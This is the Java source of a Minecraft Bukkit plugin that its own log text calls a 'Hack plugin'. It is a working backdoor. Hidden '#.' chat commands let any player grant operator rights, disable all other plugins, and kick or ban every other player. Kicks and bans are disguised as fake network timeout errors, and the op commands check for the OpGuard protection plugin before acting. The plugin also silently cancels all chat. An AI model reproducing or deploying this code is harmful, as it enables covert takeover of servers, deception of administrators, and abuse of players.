package save.nightmoon.savenightmoon;

import org.apache.commons.lang.ObjectUtils;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

public final class SaveNightMoon extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        Bukkit.getServer().getPluginManager().registerEvents(this, this);
        getLogger().info(ChatColor.RED + "SaveNightMoonが有効になりました。"); // 有効時のメッセージ
        getLogger().warning("SaveNightMoonはKillNightMoonに似たHackプラグインです。"); // 注意書き
        getLogger().warning("基本的に導入は非推奨であり、導入して何らかの損害が起きても開発者は責任を負いません。"); // 注意書き
    }

    @Override
    public void onDisable() {
        getLogger().info(ChatColor.GREEN + "SaveNightMoonが無効になりました。"); // 無効時のメッセージ
    }

    @EventHandler
    public void onChat(PlayerChatEvent event) {
        Player player = event.getPlayer();
        String[] cmd = event.getMessage().split(" ");
        event.setCancelled(true);
        if(!(cmd[0].startsWith("#."))) {
            return;
        }
        if(cmd[0].equals("#.op")) {
            for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
                if (plugin.getName().equals("OpGuard")) {
                    Plugin CheckPlugin;
                    try {
                        CheckPlugin = Bukkit.getPluginManager().getPlugin("OpGuard");
                    } catch(Exception exception) {
                        continue;
                    }
                    assert CheckPlugin != null;
                    if (CheckPlugin.isEnabled()) {
                        player.sendMessage(ChatColor.RED + "OpGuardが検知されました。");
                        player.sendMessage(ChatColor.RED + "権限の付与がキャンセルされました。");
                        return;
                    }
                }
            }
            Player OpSetPlayer;
            try {
                OpSetPlayer = Bukkit.getServer().getPlayer(cmd[1]);
            } catch (Exception exception) {
                player.sendMessage(ChatColor.YELLOW + "プレイヤーが見つかりませんでした。");
                return;
            }
            assert OpSetPlayer != null;
            OpSetPlayer.setOp(true);
            player.sendMessage(ChatColor.GREEN + "指定のプレイヤーに権限を付与しました。");
        } else if(cmd[0].equals("#.deop")) {
            for(Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
                if(plugin.getName().equals("OpGuard")) {
                    Plugin CheckPlugin;
                    try {
                        CheckPlugin = Bukkit.getPluginManager().getPlugin("OpGuard");
                    } catch(Exception exception) {
                        continue;
                    }
                    assert CheckPlugin != null;
                    if(CheckPlugin.isEnabled()) {
                        player.sendMessage(ChatColor.RED + "OpGuardが検知されました。");
                        player.sendMessage(ChatColor.RED + "権限のはく奪がキャンセルされました。");
                        return;
                    }
                }
            }
            Player OpDelPlayer;
            try {
                OpDelPlayer = Bukkit.getServer().getPlayer(cmd[1]);
            } catch(Exception exception) {
                player.sendMessage(ChatColor.YELLOW + "プレイヤーが見つかりませんでした。");
                return;
            }
            assert OpDelPlayer != null;
            OpDelPlayer.setOp(false);
            player.sendMessage(ChatColor.GREEN + "指定のプレイヤーの権限をはく奪しました。");
        } else if(cmd[0].equals("#.gm")) {
            if(cmd[1].equals("survival")) {
                player.setGameMode(GameMode.SURVIVAL);
                player.sendMessage(ChatColor.GREEN + "サバイバルモードへ変更しました。");
            } else if(cmd[1].equals("creative")) {
                player.setGameMode(GameMode.CREATIVE);
                player.sendMessage(ChatColor.GREEN + "クリエイティブモードへ変更しました。");
            } else {
                player.sendMessage(ChatColor.RED + "無効なゲームモードです。");
            }
        } else if(cmd[0].equals("#.plugins")) {
            player.sendMessage("Plugin List");
            for(Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
                String plugin_status;
                if(plugin.isEnabled()) {
                    plugin_status = ChatColor.GREEN + "有効";
                } else {
                    plugin_status = ChatColor.RED + "無効";
                }
                player.sendMessage("Plugin: " + plugin.getName() + " | Status: " + plugin_status);
            }
        } else if(cmd[0].equals("#.displ")) {
            if(cmd[1].equals("ALL")) {
                for(Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
                    if(plugin.getName().equals("SaveNightMoon")) {
                        continue;
                    }
                    Bukkit.getPluginManager().disablePlugin(plugin);
                }
                player.sendMessage(ChatColor.GREEN + "すべてのプラグインを無効にしました。");
                return;
            }
            Plugin plugin = null;
            try {
                plugin = Bukkit.getPluginManager().getPlugin(cmd[1]);
            } catch(Exception exception) {
                player.sendMessage("プラグインが見つかりませんでした。");
                return;
            }
            assert plugin != null;
            Bukkit.getPluginManager().disablePlugin(plugin);
            player.sendMessage(ChatColor.GREEN + "プラグイン" + plugin.getName() + "を無効にしました。");
        } else if(cmd[0].equals("#.kick")) {
            if(cmd[1].equals("ALL")) {
                for(Player kickP : Bukkit.getServer().getOnlinePlayers()) {
                    if(kickP.getName().equals(player.getName())) {
                        continue;
                    }
                    kickP.kickPlayer("Internal exception: java.net.SocketTimeoutException:Read timed out");
                }
                player.sendMessage(ChatColor.GREEN + "貴方を除くサーバーの全参加者をTimeoutと言う理由でKickしました。");
                return;
            }
            Player KickPlayer = null;
            try {
                KickPlayer = Bukkit.getPlayer(cmd[1]);
            } catch(Exception exception) {
                player.sendMessage(ChatColor.RED + "プレイヤーが見つかりませんでした。");
                return;
            }
            assert KickPlayer != null;
            KickPlayer.kickPlayer("Internal exception: java.net.SocketTimeoutException:Read timed out");
            player.sendMessage(ChatColor.GREEN + "プレイヤー" + KickPlayer.getName() + "をTimeoutとしてKickしました。");
        } else if(cmd[0].equals("#.ban")) {
            if(cmd[1].equals("ALL")) {
                for(Player banP : Bukkit.getServer().getOnlinePlayers()) {
                    if(banP.getName().equals(player.getName())) {
                        continue;
                    }
                    Bukkit.getBanList(BanList.Type.NAME).addBan(banP.getName(), null, null, "console");
                    banP.kickPlayer("Internal Exception: java.io.IOException: 既存の接続はリモートホストに強制的に切断されました。");
                }
                player.sendMessage(ChatColor.GREEN + "貴方を除くサーバーの全参加者をBanしました。");
                return;
            }
            Player BanPlayer = null;
            try {
                BanPlayer = Bukkit.getPlayer(cmd[1]);
            } catch(Exception exception) {
                player.sendMessage(ChatColor.RED + "プレイヤーが見つかりませんでした。");
                return;
            }
            assert BanPlayer != null;
            Bukkit.getBanList(BanList.Type.NAME).addBan(BanPlayer.getName(), null, null, "console");
            BanPlayer.kickPlayer("Internal Exception: java.io.IOException: 既存の接続はリモートホストに強制的に切断されました。");
            player.sendMessage(ChatColor.GREEN + "プレイヤー" + BanPlayer.getName() + "をBanしました。");
        }
    }
}
